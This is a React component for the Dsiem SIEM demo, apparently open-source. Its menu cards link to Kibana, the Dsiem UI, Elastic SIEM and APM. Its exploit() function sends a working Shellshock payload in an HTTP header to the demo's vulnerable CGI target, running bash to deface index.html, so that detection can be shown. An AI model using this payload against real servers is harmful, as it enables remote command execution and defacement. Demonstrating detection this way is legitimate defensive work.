import React from 'react'
import {
  EuiSpacer,
  EuiFlexGroup,
  EuiFlexItem,
  EuiPageBody,
  EuiPageContent,
  EuiPageContentBody,
  EuiGlobalToastList,
  EuiAccordion,
  EuiHeader,
  EuiHeaderSectionItem,
  EuiHeaderLogo,
  EuiHeaderLinks,
  EuiHeaderLink,
  EuiLoadingContent,
  EuiButtonToggle
} from '@elastic/eui'
import Iframe from 'react-iframe'
import { sleep, isChrome } from './utils.js'
import { Card } from './card.jsx'

const baseUrl = window.location.protocol + '//' + window.location.hostname
const appPort = window.location.port
const targetHost = baseUrl + ':8081'
const targetUrl = targetHost + '/cgi-bin/vulnerable'
const dsiemUrl = baseUrl + ':8080/ui/'
const apmUrl = baseUrl + ':5601/app/apm#/services/dsiem'
const kibanaDashboard =
  'app/kibana#/dashboard/87c18520-b337-11e8-b3e4-11404c6637fe'
const kibanaUrl = baseUrl + ':5601/' + kibanaDashboard
const kibanaCheckUrl = baseUrl + ':' + appPort + '/kibana/' + kibanaDashboard
const elasticSIEMUrl =
  baseUrl +
  ":5601/app/siem#/hosts/events?kqlQuery=(filterQuery:(expression:'threat.framework%20:*',kind:kuery),queryLocation:hosts.page)"
const directiveUrl = baseUrl + ':' + appPort + '/#/directive'
const overviewUrl = baseUrl + ':' + appPort + '/#/overview'
const docsUrl =
  'https://github.com/defenxor/dsiem/tree/master/docs#dsiem-documentation'
const codeUrl = 'https://github.com/defenxor/dsiem/'
const helpUrl = 'https://github.com/defenxor/dsiem/issues'

const initialCheckSleepTime = 3000

export class DemoMenu extends React.Component {
  constructor () {
    super()
    this.state = {
      toasts: [],
      iframeUrl: overviewUrl,
      loading: true,
      useTab: false
    }
    this.toastId = 0
    this.successCount = 0
  }

  removeToast = removedToast => {
    this.setState(prevState => {
      return {
        toasts: prevState.toasts.filter(toast => toast.id !== removedToast.id)
      }
    })
  }

  handleToggleTab = e => {
    this.setState({ useTab: e.target.checked })
  }

  openUrl = (url, forceTab) => {
    if (this.state.useTab || forceTab) {
      window.open(url, '_blank')
    } else {
      this.setState({ iframeUrl: url })
    }
  }

  componentDidMount = () => {
    this.isKibanaReady()
  }

  isKibanaReady = async () => {
    let res = false

    // simulate backend becomes ready early in development mode
    if (process.env.NODE_ENV === 'development') {
      console.log('development mode, simulating backend accessible in 6s.')
      await sleep(6000)
      res = true
      this.setState({
        loading: !res
      })
    }

    while (!res) {
      try {
        const response = await fetch(kibanaCheckUrl)
        const text = await response.text()
        if (text == null) {
          res = false
        } else {
          if (text.search('content security policy') > 0) {
            console.log('full text: ', text)
            res = true
          }
        }
      } catch (err) {
        console.log('Error reading kibana status: ', err)
        res = false
      } finally {
        this.setState({
          loading: !res
        })
      }
      if (!res) {
        await sleep(initialCheckSleepTime)
      }
    }
  }

  exploit = async () => {
    const r = Math.round(Math.random() * 1000)
    try {
      const response = await fetch(targetUrl, {
        headers: new Headers({
          'X-Custom-Header':
            '() { :; }; echo; echo; /bin/bash -c "echo \'<html><body><h1>DEFACED - ' +
            r +
            '</h1></body></html>\' > /var/www/html/index.html"'
        })
      })
      var toast
      if (response.status === 200) {
        this.successCount++
        toast = {
          id: String(this.toastId++),
          title: 'Successful exploitation ' + this.successCount + 'x',
          color: 'success'
        }
      } else {
        toast = {
          id: String(this.toastId++),
          title: 'Failed exploitation!',
          color: 'danger',
          text: 'status: ' + response.status
        }
      }
    } catch (err) {
      toast = {
        id: String(this.toastId++),
        title: 'Failed exploitation!',
        color: 'danger',
        text: 'Error: ' + err
      }
    } finally {
      this.setState(prevState => {
        return { toasts: prevState.toasts.concat(toast) }
      })
      // add r to the end to force re-render
      this.openUrl(targetHost + '?' + r)
    }
  }

  render = () => {
    return (
      <EuiPageBody>
        <EuiPageContent>
          <EuiPageContentBody>
            <EuiHeader>
              <EuiHeaderSectionItem border='right'>
                <EuiHeaderLogo iconType='securityApp'>Dsiem Demo</EuiHeaderLogo>
              </EuiHeaderSectionItem>
              <EuiHeaderLinks>
                <EuiHeaderLink onClick={() => this.openUrl(docsUrl, true)}>
                  Docs
                </EuiHeaderLink>
                <EuiHeaderLink onClick={() => this.openUrl(codeUrl, true)}>
                  Code
                </EuiHeaderLink>
                <EuiHeaderLink
                  iconType='help'
                  onClick={() => this.openUrl(helpUrl, true)}
                >
                  Help
                </EuiHeaderLink>
              </EuiHeaderLinks>
            </EuiHeader>
            <EuiSpacer />
            {this.state.loading && <EuiLoadingContent lines={1} />}

            <EuiAccordion
              id='acc1'
              buttonContent='Show or hide the menu cards.'
              initialIsOpen
              extraAction={
                <EuiButtonToggle
                  isEmpty
                  label='open on a new tab'
                  iconType={this.state.useTab ? 'check' : ''}
                  onChange={this.handleToggleTab}
                  isSelected={this.state.useTab}
                />
              }
            >
              <EuiSpacer />
              <EuiFlexGroup gutterSize='l' wrap>
                <Card
                  logo='graphApp'
                  title='Exploit target'
                  disabled={this.state.loading}
                  clickHandler={this.exploit}
                  url={targetHost}
                  desc={'Shellshock vulnerability @ ' + targetUrl}
                />
                <Card
                  logo='logoKibana'
                  title='Kibana dashboard'
                  disabled={this.state.loading}
                  clickHandler={this.openUrl}
                  url={kibanaUrl}
                  desc='The main analytic UI. Linked to Dsiem UI for alarm management.'
                />
                <Card
                  logo='logoWebhook'
                  title='Dsiem UI'
                  disabled={this.state.loading}
                  clickHandler={this.openUrl}
                  url={dsiemUrl}
                  desc='Manage alarms status/tag, see threat intel/vuln. query results, and pivot to relevant Kibana indices.'
                />
                <Card
                  logo='dataVisualizer'
                  title='Dsiem directive'
                  disabled={this.state.loading}
                  clickHandler={this.openUrl}
                  url={directiveUrl}
                  desc='Review the example directive used on this demo.'
                />
                <Card
                  logo='logoSecurity'
                  title='Elastic SIEM'
                  disabled={this.state.loading}
                  clickHandler={this.openUrl}
                  url={elasticSIEMUrl}
                  desc='Correlate Dsiem alarms further with ECS-compliant events from the Beats family and their modules.'
                />
                <Card
                  logo='logoAPM'
                  title='Elastic APM'
                  disabled={this.state.loading}
                  clickHandler={this.openUrl}
                  url={apmUrl}
                  desc='Dsiem APM integration for performance monitoring and analysis.'
                />
                {isChrome() && (
                  <Card
                    logo='addDataApp'
                    title='Open terminal'
                    disabled={this.state.loading}
                    clickHandler={this.openUrl}
                    url='chrome-extension://pnhechapfaindjhompbnflcldabbghjo/html/nassh.html'
                    //
                    desc='Use dpluger to integrate new logs and create Dsiem correlation directives (requires Chrome Secure Shell app).'
                    footerUrl='https://chrome.google.com/webstore/detail/secure-shell-app/pnhechapfaindjhompbnflcldabbghjo'
                    footerText='Install Chrome Secure Shell'
                  />
                )}
              </EuiFlexGroup>
            </EuiAccordion>
          </EuiPageContentBody>
        </EuiPageContent>
        <EuiSpacer />
        <EuiPageContent>
          <EuiPageContentBody>
            <EuiFlexGroup>
              <EuiFlexItem>
                <Iframe url={this.state.iframeUrl} height='1000px' />
              </EuiFlexItem>
            </EuiFlexGroup>
          </EuiPageContentBody>
        </EuiPageContent>
        <EuiGlobalToastList
          toasts={this.state.toasts}
          dismissToast={this.removeToast}
          toastLifeTimeMs={6000}
        />
      </EuiPageBody>
    )
  }
}
